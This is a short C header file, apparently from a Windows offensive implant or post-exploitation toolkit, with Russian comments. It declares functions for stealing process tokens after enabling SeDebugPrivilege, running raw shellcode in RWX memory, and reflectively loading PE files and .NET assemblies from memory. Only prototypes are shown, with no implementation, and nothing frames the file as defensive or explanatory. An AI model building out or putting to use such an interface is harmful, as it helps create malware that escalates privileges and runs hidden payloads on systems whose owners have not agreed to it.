#ifndef USER_H
#define USER_H

#include <windows.h>
#include <stdbool.h>
#include <stddef.h>
#include <stdint.h>

/** 
 * Запускает token стил:
 * - Включает SeDebugPrivilege
 * - Собирает все токены процессов
 * - Исплльзует первый из них
 */
bool User_StealthStart(void);

/**
 * Останавливает token stealth:
 * - Возвращает первоначальный контекст
 * - Закрывает и освобождает дублированные токены.
 */
void User_StealthStop(void);

/**
 * Выполняет shellcode RAW RWX в текущем процессе
 * @param shellcode  — указатель на байты
 * @param length     — длина в байтах
 */
bool User_ExecuteShellcode(const uint8_t *shellcode, size_t length);
/**
 * Загружает PE из памяти и вызывает его
 * @param pe_bytes — указатель на PE файл в памяти
 * @param pe_size  — размер этого блока
 */
bool User_ReflectiveLoadPE(const uint8_t *pe_bytes, size_t pe_size);

/**
 * Загружает и выполняет .NET сбор из памяти
 * @param assembly_bytes — байты сборки
 * @param assembly_size  — её размер
 */
bool User_ReflectiveLoadDotNet(const uint8_t *assembly_bytes, size_t assembly_size);
bool User_ExecuteReflectiveShellcode(const uint8_t *payload, size_t size);

#endif // USER_H
